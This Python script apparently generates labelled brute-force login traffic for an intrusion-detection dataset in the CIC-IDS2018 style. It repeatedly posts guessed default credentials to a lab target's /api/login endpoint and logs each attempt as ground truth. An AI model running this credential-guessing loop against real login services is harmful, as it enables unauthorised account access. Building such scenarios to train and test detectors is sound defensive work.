"""Repeated login/auth attempts against the target at varying rates.

CIC-IDS2018 category: Brute Force / Web Attack - Brute Force.
"""

from __future__ import annotations

import os
import random
import signal
import sys
import time

import requests

sys.path.insert(
    0,
    os.path.dirname(
        os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    ),
)

from lib.tests.logger import GroundTruthLogger
from lib.tests.scenario_config import load_from_env, wait_for_target

RUNNING = True
USERNAMES = ["admin", "root", "user", "test", "operator"]
PASSWORDS = [
    "password",
    "123456",
    "admin",
    "root",
    "toor",
    "letmein",
    "qwerty",
    "abc123",
    "passw0rd",
    "default",
]


def _shutdown(signum, frame):
    global RUNNING
    RUNNING = False


def main() -> None:
    signal.signal(signal.SIGTERM, _shutdown)
    signal.signal(signal.SIGINT, _shutdown)

    cfg = load_from_env()
    target_ip = cfg.target.ip
    attacker_ip = os.environ.get("ATTACKER_IP", "172.28.0.11")
    duration = cfg.duration
    intensity = cfg.intensity  # attempts per second

    base_url = f"http://{target_ip}:8080"
    log_path = f"/app/logs/brute_force_{attacker_ip}.csv"
    print(f"[brute_force] Target: {base_url}, Attacker: {attacker_ip}")
    print(f"[brute_force] Duration: {duration}s, Rate: {intensity} attempts/s")

    if not wait_for_target(target_ip, 8080):
        print("[brute_force] ERROR: target not reachable, aborting.")
        return

    with GroundTruthLogger(log_path, scenario="brute_force") as logger:
        count = 0
        end_time = time.time() + duration
        delay = 1.0 / max(intensity, 1)

        while RUNNING and time.time() < end_time:
            user = random.choice(USERNAMES)
            pwd = random.choice(PASSWORDS)
            try:
                resp = requests.post(
                    f"{base_url}/api/login",
                    json={"user": user, "pass": pwd},
                    timeout=2,
                )
                success = resp.status_code == 200
            except requests.RequestException:
                success = False

            count += 1
            logger.log(
                src_ip=attacker_ip,
                dst_ip=target_ip,
                dst_port=8080,
                label="brute_force",
                extra=f"user={user},success={success}",
            )
            time.sleep(delay)

    print(f"[brute_force] Completed. {count} login attempts.")


if __name__ == "__main__":
    main()
